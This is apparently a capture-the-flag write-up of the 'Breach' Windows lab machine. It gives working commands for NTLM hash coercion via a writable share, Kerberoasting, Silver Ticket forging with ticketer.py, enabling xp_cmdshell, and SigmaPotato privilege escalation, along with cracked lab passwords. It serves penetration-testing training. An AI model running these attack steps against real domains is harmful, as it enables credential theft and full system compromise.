---
layout: post
title: Breach (Vulnlab) HTB Writeup
date: 2025-11-10
author: Kerburenthusiasm
excerpt: "A detailed walkthrough of the Breach HTB challenge"
tags: [ntlm-theft,silver-ticket,seimpersonate,sigma-potato,oscp-like]
---

# Machine Information
- **Difficulty:** Medium
- **OS:** Windows
- **Domain:** breach.vl

# Initial Enumeration

## SMB Shares
The SMB shares allow authentication as `guest` with read and write access to the `share` directory. Using the tool [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), we upload generated files to each directory to coerce authentication back to our listener.

Starting Responder, we immediately obtained the NTLMv2 hash for `Julia.Wong`, which can be cracked to `Computer1`:
```
Julia.Wong::BREACH:e49da635d4ecb98d:17691051730CB0EF03F86D2A37CE384D:010100000000000080489FA42059DC01C5EB63F39F9476000000000002000800360053003000300001001E00570049004E002D004B00520052005600410047005300350036005200370004003400570049004E002D004B0042005200560041004700530035003600520037002E0036005300300030002E004C004F00430041004C000300140036005300300030002E004C004F00430041004C000500140036005300300030002E004C004F00430041004C000700080080489FA42059DC0106000400020000000800300030000000000000000100000000200000B629180FBA433D9A46006AD04F771C587F07CDDA703E40909B72DB192BC7DD640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000:Computer1
```

# Lateral Movement

## Kerberoasting
With the obtained credentials `julia.wong:Computer1`, we perform a Kerberoasting attack to enumerate service accounts:
```bash
nxc ldap breach.vl -u julia.wong -p 'Computer1' --kerberoasting kerb
LDAP        10.129.24.112   389    BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.24.112   389    BREACHDC         [+] breach.vl\julia.wong:Computer1 
LDAP        10.129.24.112   389    BREACHDC         [*] Skipping disabled account: krbtgt
LDAP        10.129.24.112   389    BREACHDC         [*] Total of records returned 1
LDAP        10.129.24.112   389    BREACHDC         [*] sAMAccountName: svc_mssql, memberOf: [], pwdLastSet: 2022-02-17 05:43:08.106169, lastLogon: 2025-11-19 06:34:32.557690
LDAP        10.129.24.112   389    BREACHDC         [*] $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\svc_mssql*$...
```

The service ticket for `svc_mssql` can be cracked to `Trustno1`. Using BloodHound, we identify the SPN as `MSSQLSvc/breachdc.breach.vl:1433`.

## Silver Ticket Attack
We craft a Silver Ticket for the administrator using Impacket's ticketer:
```bash
ticketer.py -nthash "69596C7AA1E8DAEE17F8E78870E25A5C" -domain-sid "S-1-5-21-2330692793-3312915120-706255856" -domain "breach.vl" -spn "MSSQLSvc/breachdc.breach.vl:1433" "administrator"
```

After crafting the ticket, we can now access the MSSQL service as `Administrator`:
```bash
export KRB5CCNAME=administrator.ccache
mssqlclient.py BREACHDC.breach.vl -k -windows-auth
```

### xp_cmdshell to RCE
With administrative access to MSSQL, we enable `xp_cmdshell` to execute system commands:
```sql
enable_xp_cmdshell
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
```

We execute a PowerShell reverse shell to obtain command execution as `svc_mssql`:
```powershell
PS C:\Windows\system32> whoami
breach\svc_mssql
```

# Privilege Escalation

## SeImpersonatePrivilege Exploitation
Enumerating privileges for the `svc_mssql` user, we identify that `SeImpersonatePrivilege` is enabled:
```powershell
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Using [SigmaPotato](https://github.com/looterz/SigmaPotato), we exploit this privilege to obtain SYSTEM access and retrieve the flag.
```powershell
PS C:\Windows\system32> .\SigmaPotato.exe whoami
nt authority\system
```